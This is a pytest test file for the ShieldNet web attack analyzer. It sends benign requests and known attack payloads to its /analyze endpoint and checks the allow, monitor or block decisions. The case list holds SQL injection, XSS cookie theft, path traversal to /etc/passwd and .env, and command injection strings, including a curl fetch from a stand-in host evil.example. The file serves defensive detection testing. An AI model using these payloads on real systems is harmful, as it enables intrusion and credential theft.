"""End-to-end attack battery for the ShieldNet analyzer.

Runs real attack payloads through POST /analyze with ALL models loaded
(rules + ML + anomaly + hybrid) and checks the decisions. This is the
test that found real misses during development — see docs/DEMO.md for
the results table and what was fixed.

Requires the trained model artefacts (ml/train.py + ml/train_anomaly.py);
skips cleanly when they are absent. The WAF-level battery (through
ModSecurity on :8080) is tests/run_e2e.sh and needs the Docker stack.

Run from the repo root:  pytest tests/
"""
import os
import sys

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ML_MODEL = os.path.join(ROOT, "ml", "models", "shieldnet_model.joblib")
ANOMALY_MODEL = os.path.join(ROOT, "ml", "models", "anomaly_model.joblib")

pytestmark = pytest.mark.skipif(
    not (os.path.exists(ML_MODEL) and os.path.exists(ANOMALY_MODEL)),
    reason="trained model artefacts not present — run ml/train.py and ml/train_anomaly.py",
)

os.environ.setdefault("DATABASE_URL", "sqlite:///./test_battery.db")
os.environ["MODEL_PATH"] = ML_MODEL
os.environ["ANOMALY_MODEL_PATH"] = ANOMALY_MODEL
sys.path.insert(0, os.path.join(ROOT, "backend"))

from fastapi.testclient import TestClient  # noqa: E402

from app.main import app  # noqa: E402

client = TestClient(app)
UA = {"User-Agent": "Mozilla/5.0"}
LEVEL = {"allow": 0, "monitor": 1, "block": 2}

# (name, method, uri, body, headers, minimum expected decision)
CASES = [
    ("benign product page", "GET", "/product?id=2", None, UA, "allow"),
    ("benign search", "GET", "/search?q=coffee+mug", None, UA, "allow"),
    ("benign login", "POST", "/login", "username=demo&password=demo", UA, "allow"),
    ("sqli union select", "GET", "/search?q=' UNION SELECT username, password FROM users --", None, UA, "block"),
    ("sqli login bypass", "POST", "/login", "username=admin&password=' OR '1'='1", UA, "block"),
    ("sqli sleep probe", "GET", "/product?id=1 AND SLEEP(5)", None, UA, "monitor"),
    ("xss script tag", "POST", "/comment", "<script>alert(document.cookie)</script>", UA, "block"),
    ("xss img onerror", "GET", "/search?q=<img src=x onerror=alert(1)>", None, UA, "block"),
    ("traversal passwd", "GET", "/static/../../etc/passwd", None, UA, "monitor"),
    ("traversal encoded env", "GET", "/%2e%2e%2f%2e%2e%2f.env", None, UA, "monitor"),
    ("rce cat passwd", "GET", "/search?q=x; cat /etc/passwd", None, UA, "block"),
    ("rce curl pipe", "POST", "/run", "cmd=$(curl http://evil.example/sh)", UA, "monitor"),
]


@pytest.mark.parametrize("name,method,uri,body,headers,min_decision",
                         CASES, ids=[c[0] for c in CASES])
def test_attack_battery(name, method, uri, body, headers, min_decision):
    r = client.post("/analyze", json={
        "method": method, "uri": uri, "body": body, "headers": headers})
    assert r.status_code == 200
    result = r.json()
    assert result["ml_score"] is not None, "ML model not loaded"
    assert result["anomaly_score"] is not None, "anomaly model not loaded"
    if min_decision == "allow":
        assert result["decision"] == "allow", result
    else:
        assert LEVEL[result["decision"]] >= LEVEL[min_decision], result
